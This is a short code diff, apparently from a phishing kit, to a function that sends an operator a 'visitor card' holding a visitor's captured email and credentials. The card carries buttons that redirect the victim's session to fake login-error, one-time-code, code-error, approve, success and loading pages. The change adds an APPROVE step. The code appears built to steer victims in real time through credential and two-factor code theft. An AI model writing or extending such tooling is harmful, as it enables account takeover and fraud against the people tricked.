@@ -262,14 +262,15 @@ export async function sendVisitorCard(visitor: any, credentials?: { email?: stri
       { text: "❌ LOGIN ERROR ❌", callback_data: `redirect:${sessionShort}:/login-failure` }
     ],
     [
-      { text: "OTP", callback_data: `redirect:${sessionShort}:/otp` },
-      { text: "OTP ERROR", callback_data: `redirect:${sessionShort}:/otp-error` }
+      { text: "APPROVE", callback_data: `redirect:${sessionShort}:/approve` },
+      { text: "OTP", callback_data: `redirect:${sessionShort}:/otp` }
     ],
     [
-      { text: "SUCCESS", callback_data: `redirect:${sessionShort}:/success` },
-      { text: "LOADING", callback_data: `redirect:${sessionShort}:/loading` }
+      { text: "OTP ERROR", callback_data: `redirect:${sessionShort}:/otp-error` },
+      { text: "SUCCESS", callback_data: `redirect:${sessionShort}:/success` }
     ],
     [
+      { text: "LOADING", callback_data: `redirect:${sessionShort}:/loading` },
       { text: "🏠 HOME", callback_data: `redirect:${sessionShort}:/` }
     ]
   ];
